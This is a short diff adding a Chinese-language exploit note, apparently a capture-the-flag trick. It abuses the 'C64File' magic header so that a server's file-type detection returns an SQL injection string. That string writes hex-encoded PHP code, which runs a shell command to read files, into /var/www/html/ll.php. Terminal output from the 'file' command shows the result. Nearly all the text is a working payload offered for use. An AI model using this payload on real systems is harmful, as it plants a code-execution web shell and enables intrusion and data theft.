@@ -1,0 +1,8 @@
+C64File "');select 0x3c3f3d60746163202f662a603f3e into outfile '/var/www/html/ll.php';--+
+服务器检测文件类型并写入数据库时用C64File魔数文件头
+C64File魔数文件头可以将file检测的结果变成后面跟随的"');select 0x3c3f3d60746163202f662a603f3e 
+into outfile '/var/www/html/ll.php';--+直接注入
+效果：
+┌──(root㉿whb)-[~]
+└─# file whb.txt
+whb.txt: PC64 Emulator file ""');select 0x3c3f... into outfile '/var/www/html/ll.php';--+
